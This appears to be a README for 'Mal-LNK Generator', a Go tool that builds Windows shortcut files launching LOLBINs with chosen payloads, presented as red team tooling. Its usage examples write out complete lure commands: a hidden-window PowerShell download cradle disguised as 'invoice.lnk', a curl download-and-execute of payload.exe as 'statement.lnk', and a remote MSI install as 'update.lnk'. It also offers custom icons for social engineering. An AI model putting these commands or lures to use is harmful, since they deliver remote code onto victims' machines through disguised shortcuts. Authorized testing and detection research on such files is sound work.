# Mal-LNK Generator


![image](https://github.com/user-attachments/assets/069e0dd8-1d8d-4a31-929c-a921be1fe948)




A security research tool for generating customized LNK files that leverage LOLBINs (Living Off The Land Binaries) for red team assessments and security testing.


## Overview

Mal-LNK Generator is a powerful utility designed for security professionals to create Windows shortcut (.lnk) files that simulate various techniques used in security assessments. It supports multiple LOLBINs, custom payloads, and detailed configuration options to assist in controlled security testing scenarios.

## Features

- **Multiple LOLBIN Support**: Includes 10+ common Windows binaries frequently used in security testing:
  - cmd.exe
  - powershell.exe
  - wscript.exe
  - mshta.exe
  - regsvr32.exe
  - rundll32.exe
  - explorer.exe
  - bitsadmin.exe
  - certutil.exe
  - msiexec.exe

- **Flexible Configuration Options**:
  - Custom command-line parameters
  - Configurable window style (normal, maximized, or minimized)
  - Custom working directories
  - Custom icons for better social engineering simulations
  - Support for custom binaries not in the predefined list

- **Multiple Operation Modes**:
  - Interactive mode with guided prompts for easier usage
  - Command-line mode for automation and integration with other tools
  - List mode to display all available LOLBINs and their configurations

## Installation

### Prerequisites

- Go 1.16 or higher
- Windows operating system (for creating valid LNK files)

### Building from Source

1. Clone the repository:
```
git clone https://github.com/yourusername/mal-lnk-generator.git
cd mal-lnk-generator
```

2. Initialize Go module and download dependencies:
```
go mod init mal-lnk-generator
go mod tidy
```

3. Build the executable:
```
go build -o mal-lnk-generator.exe
```

## Usage

### Interactive Mode

Run the tool in interactive mode for a guided, menu-driven experience:

```
mal-lnk-generator -interactive
```

### Command Line Mode

Generate an LNK file using PowerShell with a specific payload:

```
mal-lnk-generator -bin 2 -payload "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')" -output "document.lnk"
```

Create a shortcut with a custom binary:

```
mal-lnk-generator -custom-path "C:\Path\To\Application.exe" -custom-params "-arg {payload}" -payload "actual command" -output "custom.lnk"
```

### List Available LOLBINs

Display all available LOLBINs and their configurations:

```
mal-lnk-generator -list
```

### Common Examples

#### Creating a stealthy PowerShell downloader:

```
mal-lnk-generator -bin 2 -payload "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')" -output "invoice.lnk" -window 7
```

#### Creating a CMD-based file downloader:

```
mal-lnk-generator -bin 1 -payload "curl -s http://example.com/payload.exe -o %temp%\payload.exe && %temp%\payload.exe" -output "statement.lnk"
```

#### Using MSI installer for payload execution:

```
mal-lnk-generator -bin 10 -payload "http://example.com/package.msi" -output "update.lnk"
```

## Command Line Options

| Flag | Description | Default |
|------|-------------|---------|
| `-interactive` | Run in interactive mode | `false` |
| `-list` | List available LOLBINs | `false` |
| `-bin` | Index of LOLBIN to use (1-based) | `0` |
| `-payload` | Payload or command to execute | `""` |
| `-output` | Output LNK file path | `"malicious.lnk"` |
| `-workdir` | Working directory for the shortcut | `""` |
| `-icon` | Path to icon file | `""` |
| `-window` | Window style (1=normal, 3=maximized, 7=minimized) | `7` |
| `-custom-path` | Custom binary path (for custom binary) | `""` |
| `-custom-params` | Custom parameters (for custom binary) | `""` |
| `-custom-desc` | Custom description (for custom binary) | `"Custom Shortcut"` |

## Disclaimer and Legal Notice

This tool is provided for legitimate security research, education, and authorized penetration testing only. Misuse of this software may violate laws and regulations.

**The user assumes all responsibility for the use of this tool:**

- Only use on systems you own or have explicit permission to test
- Document all testing activities in accordance with proper security assessment procedures
- Remove all artifacts from target systems after testing is complete
- Do not use for unauthorized access or malicious purposes

The developers are not responsible for any illegal use of this software.

## License

[MIT License](LICENSE)

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

